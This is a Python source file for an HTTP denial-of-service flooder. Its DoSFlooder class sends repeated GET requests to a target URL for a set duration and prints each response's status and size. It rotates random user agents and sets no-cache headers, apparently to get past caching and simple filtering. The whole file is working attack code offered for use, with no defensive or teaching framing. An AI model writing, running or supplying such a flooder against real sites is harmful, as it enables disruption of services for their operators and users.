import json
import random
import requests
from time import time
from colorama import Fore
from requests.exceptions import Timeout


class DoSFlooder:
    def __init__(self, target_url, user_agents_file="DoS/user_agents.json"):
        self.target_url = target_url
        self.user_agents = self.load_user_agents(user_agents_file)
        self.headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
        }
        self.color_code = {True: Fore.GREEN, False: Fore.RED}

    @staticmethod
    def load_user_agents(user_agents_file):
        with open(user_agents_file, "r") as agents:
            return json.load(agents)["agents"]

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def flood(self):
        headers = self.headers.copy()
        headers["User-Agent"] = self.get_random_user_agent()

        try:
            response = requests.get(
                self.target_url, headers=headers, timeout=4)
        except (Timeout, OSError):
            return
        else:
            status_code = response.status_code
            status_color = self.color_code[status_code == 200]
            payload_size = round(len(response.content) / 1024, 2)

            status = f"{status_color}Status: [{status_code}]"
            payload_size_str = f"Requested Data Size: {Fore.CYAN}{payload_size:>6} KB"
            print(f"{status}{Fore.RESET} --> {payload_size_str} {Fore.RESET}")


def run_flood_for_duration(flooder, duration):
    start_time = time()
    while time() - start_time < duration:
        flooder.flood()
